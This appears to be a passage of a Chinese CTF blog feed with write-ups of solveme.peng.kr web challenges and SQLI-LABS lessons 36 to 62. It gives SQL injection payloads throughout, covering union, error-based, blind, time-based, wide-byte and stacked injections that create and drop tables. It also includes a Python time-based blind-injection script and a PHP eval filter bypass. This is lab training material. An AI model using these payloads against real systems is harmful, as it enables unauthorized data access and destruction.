class=\"line\">            )</span><br><span class=\"line\">        );</span><br><span class=\"line\">        mysqli_close($con);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($result))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>($result[<span class=\"string\">'no'</span>] === <span class=\"string\">'31337'</span>)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> $flag;</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">'Hello, '</span>, $result[<span class=\"string\">'id'</span>];</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">'Login failed'</span>;</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure></p>\n<p>该正则匹配中 <code>|\\\\|</code> 是无法匹配到 <code>\\</code> 的，必须要用四个才可以，所以这道题目中 \\ 是可以用的，用 <code>id=\\</code> 可以成功吃掉一个引号。<br>正则中 <code>union[\\s\\xA0]+select</code> 还可考虑用 <code>union all select</code> 绕过，正则 <code>--[\\s\\xA0]</code> ，其中查资料发现</p>\n<blockquote>\n<p>\\s :匹配任何不可见字符，包括空格、制表符、换页符等等。等价于[\\f\\n\\r\\t\\v]</p>\n</blockquote>\n<p>也就是说还有其它字符可以匹配，例如 <code>%01,%11,%02</code> ，基于以上内容可以构造payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1\\&amp;pw&#x3D;union all select 1222,212,12 from antisqli--%10</span><br></pre></td></tr></table></figure>\n<p>最终payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1\\&amp;pw&#x3D;union all select 31337,2,3 from antisqli--%10</span><br></pre></td></tr></table></figure>\n<h1 id=\"Name-Check\"><a href=\"#Name-Check\" class=\"headerlink\" title=\"Name Check\"></a>Name Check</h1><p>关键过滤如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(preg_match(<span class=\"string\">\"/admin|--|;|\\(\\)|\\/\\*|\\\\0/i\"</span>, $name))</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$res = $sql-&gt;query(<span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\">            SELECT </span></span><br><span class=\"line\"><span class=\"string\">            MAX('0','1','&#123;$name&#125;') LIKE 'a%', </span></span><br><span class=\"line\"><span class=\"string\">            INSTR('&#123;$name&#125;','d')&gt;0, </span></span><br><span class=\"line\"><span class=\"string\">            MIN('&#123;$name&#125;','b','c') LIKE '__m__', </span></span><br><span class=\"line\"><span class=\"string\">            SUBSTR('&#123;$name&#125;',-2)='in'</span></span><br><span class=\"line\"><span class=\"string\">        ;\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($res === <span class=\"keyword\">false</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">'Database error'</span>;</span><br><span class=\"line\">            <span class=\"keyword\">goto</span> quit;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $row = $res-&gt;fetchArray(SQLITE3_NUM);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(</span><br><span class=\"line\">            $row[<span class=\"number\">0</span>] + $row[<span class=\"number\">1</span>] + $row[<span class=\"number\">2</span>] + $row[<span class=\"number\">3</span>] !== <span class=\"number\">4</span> ||</span><br><span class=\"line\">            array_sum($row) !== <span class=\"number\">4</span> </span><br><span class=\"line\">        )&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">'Auth failed'</span>;</span><br><span class=\"line\">            <span class=\"keyword\">goto</span> quit;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $flag;</span><br></pre></td></tr></table></figure>\n<p>看代码可知题目应该是要求四个选择条件都成立，按照题目要求应该就是输入admin才可以，但是题目过滤了admin，查阅sqlite发现，它在连接字符串的时候用的是 <code>||</code> 而不是 <code>+</code> ，所以payload： <code>?name=ad&#39;||&#39;min</code> </p>\n<h1 id=\"I-am-slowly\"><a href=\"#I-am-slowly\" class=\"headerlink\" title=\"I am slowly\"></a>I am slowly</h1><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($answer))&#123;</span><br><span class=\"line\">    $con = mysqli_connect($sql_host, $sql_username, $sql_password, $sql_dbname)</span><br><span class=\"line\">        <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>(<span class=\"string\">'SQL server down'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    $result = mysqli_fetch_array(</span><br><span class=\"line\">        mysqli_query($con, <span class=\"string\">\"SELECT `count` FROM `&#123;$table&#125;`;\"</span>)</span><br><span class=\"line\">    );</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>($result))&#123;</span><br><span class=\"line\">        mysqli_query($con, <span class=\"string\">\"CREATE TABLE IF NOT EXISTS `&#123;$table&#125;` (`answer` char(32) NOT NULL, `count` int(4) NOT NULL);\"</span>);</span><br><span class=\"line\">        $new_answer = md5(sha1(<span class=\"string\">'iamslowly_'</span>.mt_rand().<span class=\"string\">'_'</span>.mt_rand().<span class=\"string\">'_'</span>.mt_rand()));</span><br><span class=\"line\">        mysqli_query($con, <span class=\"string\">\"INSERT INTO `&#123;$table&#125;` (`answer`,`count`) VALUES ('&#123;$new_answer&#125;',1);\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;<span class=\"keyword\">elseif</span>($result[<span class=\"string\">'count'</span>] === <span class=\"string\">'12'</span>)&#123;</span><br><span class=\"line\">        mysqli_query($con, <span class=\"string\">\"DROP TABLE `&#123;$table&#125;`;\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'Game over'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> quit;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $randtime = mt_rand(<span class=\"number\">1</span>, <span class=\"number\">10</span>);</span><br><span class=\"line\">    $result = mysqli_fetch_array(</span><br><span class=\"line\">        mysqli_query($con, <span class=\"string\">\"SELECT * FROM `&#123;$table&#125;` WHERE sleep(&#123;$randtime&#125;) OR `answer`='&#123;$answer&#125;';\"</span>)</span><br><span class=\"line\">    );</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($result) &amp;&amp; $result[<span class=\"string\">'answer'</span>] === $answer)&#123;</span><br><span class=\"line\">        mysqli_query($con, <span class=\"string\">\"DROP TABLE `&#123;$table&#125;`;\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $flag;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        mysqli_query($con, <span class=\"string\">\"UPDATE `&#123;$table&#125;` SET `count`=`count`+1;\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'Go fast'</span>;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>代码大概流程大概count=12或者table不存在的时候就建立新表重置count次数，然后知道answer相同时才会输出flag，限定了每轮只能尝试12次，之后answer就会变化且重置次数，但是题目存在逻辑漏洞，题目关键顺序是：</p>\n<blockquote>\n<p>判断count的值—&gt;执行SQL语句—&gt;加count值</p>\n</blockquote>\n<p>按照这个逻辑顺序，当count=11的时候，我们执行一个sleep()时间很长的语句，该请求就会长时间停在 <code>执行SQL语句</code> 流程中，如果此时我们再发起一次正常请求，判断count值还是11，执行完SQL语句之后count+1=12，再当上一条SQL语句执行完毕后count再加1等于13，于是之后就可以无限制提交请求了，然后在利用盲注来获得answer</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">keys = <span class=\"string\">'0123456789abcdef'</span></span><br><span class=\"line\">header = &#123;</span><br><span class=\"line\"><span class=\"string\">\"Host\"</span>:<span class=\"string\">\"iamslowly.thinkout.rf.gd\"</span>,</span><br><span class=\"line\"><span class=\"string\">\"Cache-Control\"</span>:<span class=\"string\">\"max-age=0\"</span>,</span><br><span class=\"line\"><span class=\"string\">\"Upgrade-Insecure-Requests\"</span>:<span class=\"string\">\"1\"</span>,</span><br><span class=\"line\"><span class=\"string\">\"User-Agent\"</span>:<span class=\"string\">\"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36\"</span>,</span><br><span class=\"line\"><span class=\"string\">\"Accept\"</span>:<span class=\"string\">\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\"</span>,</span><br><span class=\"line\"><span class=\"string\">\"Referer\"</span>:<span class=\"string\">\"http://solveme.peng.kr/chall\"</span>,</span><br><span class=\"line\"><span class=\"string\">\"Accept-Language\"</span>:<span class=\"string\">\"zh-CN,zh;q=0.8\"</span>,</span><br><span class=\"line\"><span class=\"string\">\"Cookie\"</span>:<span class=\"string\">\"__test=8f5247d83ccd8573674837d6f9a37fd1\"</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">payload = <span class=\"string\">'440763269e2fe7a672a52ea827728'</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">30</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> keys:</span><br><span class=\"line\">        url = <span class=\"string\">\"http://iamslowly.thinkout.rf.gd/?i=1&amp;answer=' or if((answer like '&#123;&#125;%'),sleep(50),2)%23\"</span>.format(payload + j)</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            content = requests.get(url,headers=header,timeout=<span class=\"number\">30</span>).content</span><br><span class=\"line\">            print(content[:<span class=\"number\">10</span>])</span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            payload += j</span><br><span class=\"line\">            print(payload)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n<p>这题目盲注时间有点长，这里贴一下结果 <code>440763269e2fe7a672a52ea827728539</code> 。</p>\n<h1 id=\"Check-via-eval\"><a href=\"#Check-via-eval\" class=\"headerlink\" title=\"Check via eval\"></a>Check via eval</h1><p>主要代码如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$exam = <span class=\"string\">'return\\''</span>.sha1(time()).<span class=\"string\">'\\';'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'flag'</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;a href=\"./?flag='</span>.$exam.<span class=\"string\">'\"&gt;Click here&lt;/a&gt;'</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (strlen($_GET[<span class=\"string\">'flag'</span>]) != strlen($exam)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'Not allowed length'</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (preg_match(<span class=\"string\">'/`|\"|\\.|\\\\\\\\|\\(|\\)|\\[|\\]|_|flag|echo|print|require|include|die|exit/is'</span>, $_GET[<span class=\"string\">'flag'</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'Not allowed keyword'</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">eval</span>($_GET[<span class=\"string\">'flag'</span>]) === sha1($flag)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $flag;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>题目过滤了括号，也基本过滤完了能用的函数，所以思路就是在 <code>eval($_GET[&#39;flag&#39;])</code> 中让其直接输出flag，虽然题目过滤了flag，但是PHP文档中有如下内容 <a href=\"http://php.net/manual/zh/language.basic-syntax.phpmode.php\" target=\"_blank\" rel=\"noopener\">Click Here</a> ，也就是说可以用 <code>&lt;?= expression?&gt;</code> 来达到绕过 <code>echo</code> 过滤的目的。</p>\n<p>我们可以构造 <code>&lt;?= flag?&gt;</code> 来输出flag，尝试构造payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$a&#x3D;&#39;alag&#39;;$a&#123;0&#125;&#x3D;&#39;f&#39;;?&gt;11111111111111111;&lt;?&#x3D;$$a;?&gt;</span><br></pre></td></tr></table></figure>","categories":["writeup"],"tags":["CTF"]},{"title":"Rootme网站做题记录(三)","url":"/2020/09/13/rootme2/","content":"<script src=\"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js\"></script>\n<div id=\"hbe-security\">\n  <div class=\"hbe-input-container\">\n  <input type=\"password\" class=\"hbe-form-control\" id=\"pass\" placeholder=\"Password plz...\" />\n    <label for=\"pass\">Password plz...</label>\n    <div class=\"bottom-line\"></div>\n  </div>\n</div>\n<div id=\"decryptionError\" style=\"display: none;\">Incorrect Password!</div>\n<div id=\"noContentError\" style=\"display: none;\">No content to display!</div>\n<div id=\"encrypt-blog\" style=\"display:none\">\\n</div>\n<script src=\"/lib/crypto-js.js\"></script><script src=\"/lib/blog-encrypt.js\"></script><link href=\"/css/blog-encrypt.css\" rel=\"stylesheet\" type=\"text/css\">","categories":["writeup"],"tags":["CTF"]},{"title":"SQLI-LABS(Less36-Less65)","url":"/2018/03/05/sqli-labs3/","content":"<p>接上篇</p>\n<a id=\"more\"></a>\n<h1 id=\"LESS-36\"><a href=\"#LESS-36\" class=\"headerlink\" title=\"LESS-36\"></a>LESS-36</h1><p>函数<code>mysql\\_real\\_escape\\_string()</code>转义SQL语句中使用的字符串中的特殊字符。<br>下列字符受影响：</p>\n<blockquote><p>\\x00<br>\\n<br>\\r<br>\\<br>‘<br>“<br>\\x1a</p>\n</blockquote>\n<p>如果成功，则该函数返回被转义的字符串。如果失败，则返回false。</p>\n<p>可以使用宽字节注入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;-1%df&#39; union select 1,database(),3--+</span><br></pre></td></tr></table></figure>\n<p>在使用<code>mysql_real_escape_string()</code>函数时，想要避免这种问题，需要将mysql设置为<code>gbk</code>即可</p>\n<h1 id=\"LESS-37\"><a href=\"#LESS-37\" class=\"headerlink\" title=\"LESS-37\"></a>LESS-37</h1><p>和34关绕过一样，waf和36关差不多</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=admin♦' or 1=1 limit 3,1<span class=\"comment\">#&amp;passwd=admin&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>\n<hr>\n<h1 id=\"堆叠注入stacked-injection\"><a href=\"#堆叠注入stacked-injection\" class=\"headerlink\" title=\"堆叠注入stacked injection\"></a><code>堆叠注入stacked injection</code></h1><p>所谓堆叠注入，就是指多条SQL语句同时执行，在命令行中每个SQL语句都是以<code>;</code>结尾。虽然说union语句也可以执行两条select语句，区别在于union语句可以执行的语句有限，而堆叠注入可以执行任何语句。比如<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from pruducts where id&#x3D;1;delete from products</span><br></pre></td></tr></table></figure></p>\n<p>堆叠注入的局限性在于并非每个环境都可以执行，受到环境的限制，</p>\n<hr>\n<h1 id=\"LESS-38\"><a href=\"#LESS-38\" class=\"headerlink\" title=\"LESS-38\"></a>LESS-38</h1><p>本题明注盲注皆可以，明注payload<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;-1&#39; union select 1,group_concat(username),3 from users--+</span><br></pre></td></tr></table></figure></p>\n<p><strong>堆叠注入</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;-1&#39;;create table test like users--+</span><br></pre></td></tr></table></figure><br>可以看到数据库里面成功创建，然后再删除一下<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;-1&#39;;drop table test--+</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"LESS-39\"><a href=\"#LESS-39\" class=\"headerlink\" title=\"LESS-39\"></a>LESS-39</h1><p>payload<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;-1 union select 1,2,3--+</span><br></pre></td></tr></table></figure></p>\n<p>也可堆叠注入</p>\n<h1 id=\"LESS-40\"><a href=\"#LESS-40\" class=\"headerlink\" title=\"LESS-40\"></a>LESS-40</h1><p>盲注payload<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;2&#39;) and ascii(substr(database(),1,1))&#x3D;115--+</span><br></pre></td></tr></table></figure><br>本题错误不回显，不能报错注入</p>\n<h1 id=\"LESS-41\"><a href=\"#LESS-41\" class=\"headerlink\" title=\"LESS-41\"></a>LESS-41</h1><p>和40关一样无法报错，可以和39关一样<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;-1;create table test like users--+</span><br></pre></td></tr></table></figure><br>多条命令执行。也可以注入<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;-1 union select 1,2,database()--+</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"LESS-42\"><a href=\"#LESS-42\" class=\"headerlink\" title=\"LESS-42\"></a>LESS-42</h1><p>本关mysqli_real_escape_string只过滤了username字段，对于password则没有过滤，payload<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">login_user&#x3D;admin&amp;login_password&#x3D;c&#39;;create table test like users#</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"LESS-43\"><a href=\"#LESS-43\" class=\"headerlink\" title=\"LESS-43\"></a>LESS-43</h1><p>和42关一样，只是闭合方式不同<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">login_user&#x3D;admin&amp;login_password&#x3D;c&#39;) or 1&#x3D;1#</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"LESS-44\"><a href=\"#LESS-44\" class=\"headerlink\" title=\"LESS-44\"></a>LESS-44</h1><p>和42关一样，只是没有报错无法盲注<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">login_user&#x3D;admin&amp;login_password&#x3D;c&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"LESS-45\"><a href=\"#LESS-45\" class=\"headerlink\" title=\"LESS-45\"></a>LESS-45</h1><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">login_user&#x3D;admin&amp;login_password&#x3D;c&#39;) or 1&#x3D;1#</span><br></pre></td></tr></table></figure>\n<p>注意：这几关页面都在login.php页面，不在原页面。</p>\n<h1 id=\"LESS-46\"><a href=\"#LESS-46\" class=\"headerlink\" title=\"LESS-46\"></a>LESS-46</h1><p>本关是<code>order by</code>注入，<br>尝试一下分号发现有报错，报错注入可以用一下<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?sort&#x3D;2 and extractvalue(1,concat(0x3c,(select database())))</span><br></pre></td></tr></table></figure><br>看不到数据库名的话查看一下元素即可</p>\n<p>对于这种问题有三种方法</p>\n<blockquote>\n<p>1、直接添加注入语句 <code>?sort=(select \\*\\*\\*\\*\\*\\*)</code><br>2、利用一些函数，例如rand函数，<code>?sort=rand(sql语句)</code>，而且此处rand(true)和rand(false)是不相同的。<br>3、利用and，例如<code>?sort=1 and (加sql语句)</code></p>\n</blockquote>\n<p>还可以执行infile等命令上传一句话木马</p>\n<h1 id=\"LESS-47\"><a href=\"#LESS-47\" class=\"headerlink\" title=\"LESS-47\"></a>LESS-47</h1><p>本关只是闭合方式发生了变化，只能进行报错和延时注入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?sort&#x3D;1&#39; and extractvalue(1,concat(0x3c,(select database())))%23</span><br><span class=\"line\">?sort&#x3D;1 and if(1&#x3D;1, sleep(1), null)</span><br><span class=\"line\">?sort&#x3D;1&#39; and (length(database())) &#x3D; 8 and if(1&#x3D;1, sleep(1), null)%23</span><br><span class=\"line\">?sort&#x3D;1&#39; and (ascii(substr((select database()) ,1,1))) &#x3D; 115 and if(1&#x3D;1, sleep(1), null)%23</span><br></pre></td></tr></table></figure>\n<h1 id=\"LESS-48\"><a href=\"#LESS-48\" class=\"headerlink\" title=\"LESS-48\"></a>LESS-48</h1><p>这关没有报错回显，延时盲注即可<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?sort&#x3D;1 and (length(database())) &#x3D; 8 and if(1&#x3D;1, sleep(1), null)%23</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"LESS-49\"><a href=\"#LESS-49\" class=\"headerlink\" title=\"LESS-49\"></a>LESS-49</h1><p>跟上关差不多只是闭合方式不同<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?sort&#x3D;1&#39; and (length(database())) &#x3D; 8 and if(1&#x3D;1, sleep(1), null)%23</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"LESS-50\"><a href=\"#LESS-50\" class=\"headerlink\" title=\"LESS-50\"></a>LESS-50</h1><p>考察order by的堆叠注入<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?sort&#x3D;1;create table test like users;</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"LESS-51\"><a href=\"#LESS-51\" class=\"headerlink\" title=\"LESS-51\"></a>LESS-51</h1><p>闭合方式不同<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?sort&#x3D;1&#39;;create table test like users--+</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"LESS-52\"><a href=\"#LESS-52\" class=\"headerlink\" title=\"LESS-52\"></a>LESS-52</h1><p>本题不报错，无法报错注入，依然可以堆叠注入<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?sort&#x3D;1;create table test like users</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"LESS-53\"><a href=\"#LESS-53\" class=\"headerlink\" title=\"LESS-53\"></a>LESS-53</h1><p>本关错误不能回显，但是可以和51关一样堆叠注入<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?sort&#x3D;1&#39;;create table test like users--+</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"LESS-54\"><a href=\"#LESS-54\" class=\"headerlink\" title=\"LESS-54\"></a>LESS-54</h1><p>从本关开始进行更加进阶的注入，所用数据库也改为<code>challenges</code>，每个答案只能尝试10次，10次之后则会重置表名选项等信息。</p>\n<p>由于已经知道数据库名，所以可以直接开始爆表名<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()--+</span><br></pre></td></tr></table></figure></p>\n<p>得到表名 <code>utj0xhedjp</code>(你的和我的不一样，是随机的)，接下来爆列名<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;utj0xhedjp&#39;--+</span><br></pre></td></tr></table></figure></p>\n<p>得到<code>id,sessid,secret_W2TD,tryy</code>，得到字段<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;-1&#39; union select 1,secret_W2TD,3 from utj0xhedjp--+</span><br></pre></td></tr></table></figure><br>得到<code>vYPh8AlkQMTlEGkZXRKWo1PT</code>，提交即可。</p>\n<h1 id=\"LESS-55\"><a href=\"#LESS-55\" class=\"headerlink\" title=\"LESS-55\"></a>LESS-55</h1><p>本关限制次数为14次，主要是前面尝试闭合，这个找出来后面就简单了<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1)%23</span><br></pre></td></tr></table></figure></p>\n<p>爆表名<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;-1) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()%23</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>jq0p5t7r1m</p>\n</blockquote>\n<p>爆列名<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;-1) union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;jq0p5t7r1m&#39;%23</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>id,sessid,secret_3JXI,tryy</p>\n</blockquote>\n<p>继续<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;-1) union select 1,secret_3JXI,3 from jq0p5t7r1m%23</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"LESS-56\"><a href=\"#LESS-56\" class=\"headerlink\" title=\"LESS-56\"></a>LESS-56</h1><p>payload<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1&#39;)%23</span><br></pre></td></tr></table></figure></p>\n<p>剩下的就不做了。</p>\n<p><strong>注意：</strong>本题中，如果用<code>?id=1”%23</code>也可以闭合，只是无法继续后面的步骤，提交上述参数后执行的SQL语句为<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT * FROM security.users WHERE id&#x3D;(&#39;1&quot;#&#39;) LIMIT 0,1</span><br></pre></td></tr></table></figure><br>在数据库中执行确实能够查到数据，那么问题在哪呢？</p>\n<blockquote>\n<p>查找资料后发现，mysql在运算过程中能够自动的把数字转化为字符串，而在比较运算中，如果是数字和字符串比较，则可以自动的把字符串转为数字，转换的时候如果首字符字符是数字，则会转换为相应的数字，例如<code>&#39;1&quot;#&#39;</code>转化为数字值为1，如果是<code>&#39;11fads&#39;</code>则为11，不过必须是数字和字符串比较的时候才会转换，如果都是字符的话则不会这样。 </p>\n</blockquote>\n<h1 id=\"LESS-57\"><a href=\"#LESS-57\" class=\"headerlink\" title=\"LESS-57\"></a>LESS-57</h1><p>本题是双引号闭合<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1&quot;%23</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"LESS-58\"><a href=\"#LESS-58\" class=\"headerlink\" title=\"LESS-58\"></a>LESS-58</h1><p>本题无法进行联合注入，但是可以报错，故报错注入<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1&#39; and extractvalue(1,concat(0x5c,(select )))%23</span><br></pre></td></tr></table></figure><br>爆内容<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1&#39; and extractvalue(1,concat(0x5c,(select secret_AJHH from y9hrni0ywl)))%23</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"LESS-59\"><a href=\"#LESS-59\" class=\"headerlink\" title=\"LESS-59\"></a>LESS-59</h1><p>本题可以直接报错注入<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1 and extractvalue(1,concat(0x5c,(select database())))%23</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"LESS-60\"><a href=\"#LESS-60\" class=\"headerlink\" title=\"LESS-60\"></a>LESS-60</h1><p>改变闭合方式<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1&quot;) and extractvalue(1,concat(0x5c,(select database())))%23</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"LESS-61\"><a href=\"#LESS-61\" class=\"headerlink\" title=\"LESS-61\"></a>LESS-61</h1><p>双引号闭合，有点奇葩<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1&#39;)) and extractvalue(1,concat(0x5c,(select database())))--+</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"LESS-62\"><a href=\"#LESS-62\" class=\"headerlink\" title=\"LESS-62\"></a>LESS-62</h1><p>本题没有错误回显，无法union注入，而且注释符貌似也被过滤了，可以考虑盲注<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1&#39; and length(database())&#x3D;10 and &#39;a&#39;&#x3D;&#39;a</span><br></pre></td></tr></table></figure><br>爆表名<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database()),1,1))&#x3D;54 and &#39;a&#39;&#x3D;&#39;a</span><br></pre></td></tr></table></figure><br>爆列名<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1&#39; and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;64r31rkgr6&#39;),2,1))&#x3D;100 and 